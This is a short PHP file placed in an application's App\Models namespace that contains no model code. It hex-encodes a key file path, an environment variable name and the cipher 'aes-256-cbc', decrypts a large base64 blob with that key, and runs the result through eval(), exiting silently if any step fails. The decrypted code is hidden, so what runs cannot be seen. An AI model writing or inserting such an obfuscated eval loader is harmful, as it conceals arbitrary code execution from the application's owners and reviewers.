<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('HIEXNOOx0hVjl150LHrtyw==');

$c=base64_decode(

'UQAPxB1OTPO3uFuWC4veRjpQ+KFLi3Rm6Zx+ec/he4u/x8dnVjBhenedKyaLe/qvbNVtA6u0kOre' .
'Un1x2rorCEOKbbYtTbEXLjFYJDl8emgpprwIfx/VY1e282CiX17zfZxKFc3oecuvaGK1mvgZnp9Z' .
'77lmbFObTtlcHaSsj4l6QEnaby+lO3RvfSndj8eCl2+1d7Lhu9hsI9SiskX4fJZqsxCxxhQkqMLs' .
'ysniwVKk/ZfJ2krY2pbB8biOODkFDZ+1n3jR4R5CKy+w7OBasMz1/mL34GhFGj0GleS8t+WBJIQC' .
'GtB51KpU+B/era1+UhY75VthFjE2aEPnqacuw4i5TgOpIZ5wBTKtPIPk54uSTxiIGRFDV5pYsBpV' .
'RMspj0dY/UaE29Evwk+BfuXkoN8Ijrke1BJDX0+K6gREZNb7hThZ/qsuWUBhhidrRYPL5LUIJNLG' .
'6JWDjwROR/c9e5+FOJcGMN/iLGUf++0KJG0Y24bJUJW/Y7s0wKAfBjsuzs6lFbDjST2N5vZq6ZJi' .
'OApcw8hqjhXxegcTfXj2dHnceOfnT7Be0X+UuNo2LvycEyybibBZm4v6nSZUyiKkcfMu8Morsjkp' .
'QDFwIjSy2qgTU56ZBul/MpoSFER6GL6ZClb9lRV/xuLdc9zM6+umZDE3qFb34uDI990ZirF22KoS' .
'bPqJGmGVeD9FOCVNjlGpJSTEh87pInB90Ii8jSbOlH06vmvrBa/X3R2ZdoHqVSDB7OUAjAuhZFLI' .
'WyEF4KjwsySKKVN6+R3vXToTk0fhy8NnvaaNf2fn+dJ+yMDTqin5v5H1DIw7dovdxvKNkeEmbGba' .
'CuunCETRAHxxm/plJRQjArpzWNEkxEY0ZVhYxstEpjJXvqNdJsZYx9cRrLBS41avKvKAhhCytH89' .
'foppjZgJkT0EbGUPjy+LkaFAz99GtoG5Dbwqvvf9u48liFhamm4CFapnxzSFS9x+ES138oCm1gad' .
'KjQBbNPZHmSZLS0jsGjgH4unUnLGWKD+WgysW1La+vAp+NaI4HAj+vslSKrIA3kcaNi/PE4nqxR6' .
'lSx79yk+2Nb47SI1ZbPNum83+PwmSU3FKQEETPDMCgjc//97Q6m2v865zqbjmdX6xQyaqMBwybuF' .
'rFhuveXM/Wpkwk0OzlIw09TnkZLKz9m4kvmSJcql+M6MC2abTDyMhb77NXKUoqO8mLBIow+WV0+X' .
'yf1lU4xvn0R2a8AK53N717qRzeFPbz2PRsJ+S6w0sbKu8xxJiLcb1JOSMmU2fLzQoJicHsaxvp1U' .
'h/ACXF/ag/JUGCym+AhYmu4AxWFIFFoKNefFFoPuvNbaRJpGvccWYZL9DWzPeToeUAmtLDctZX7H' .
'zBxBxDvHexyRJhI6wfNpiqrpIfLBGyVWO/wP+TcEA2+LPbc3s7/McaoVNOxufQNK/ymR8XxZZrdU' .
'G4QKcQ5LTE2cb2eZ5QUeK+OqdwERnVVjwZ5P28VA76+MnPYxAM7pdfGRMOH29ZdU4qOo1gCJwVf7' .
'kDOY7mIJ/coweiIQ6K8L6g87E7ZC6PI7vDAnvQNc7hdDyLqSPpbZu9B00jSMViMAyiXda9ZRmu1O' .
'82OYjFebLYURGqBdLAqY+fZ1dzs1vIBWEhMufILlW5sy+mpj/4qzmbFZQV19KqV9cKqvigCAJlG6' .
'yGTe83t4JQ7MpY1vUSkyqKeBeatj48AiqrSiAAMJARwM8ZpAt47TFvLH4yuHFhVzFTyN8XhVeL1Q' .
'Yes+oQPTE4cpcQvBgxCSw3sQUyHZJWSXKbrSxDDbweX2A+NIdp6dDla6ALg1cw+C5jNMBCzOq4dU' .
'M3tzGA1NAwpUavvcQRnqOm9v+N3G4RCDFlYfJ1R+26MbjPbRi23JVdx9vWtNxpePqkd5yD9y8tTs' .
'WPfLx/WaeHC68/UugxMmMZEOVR74Y/mPjKUv6cTXRnH8tX0Hs3fKFzVlRFHeLPx7cCVIzOGHNycw' .
'b01j/K7G7RAp1EOOBSj6txpq2tpugFrxC6tBtd5AXjlqq1y6AJjeG2hAk3kmvan3ZK2Riagh0j83' .
'KgjFzpyOMW9GmLGBwEcxA5kv0gsYJ4GX54cnDAJhIlHOH+5334TkacUJEEVov0e+G2LLA0F9ZfHY' .
'Cj/GmA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

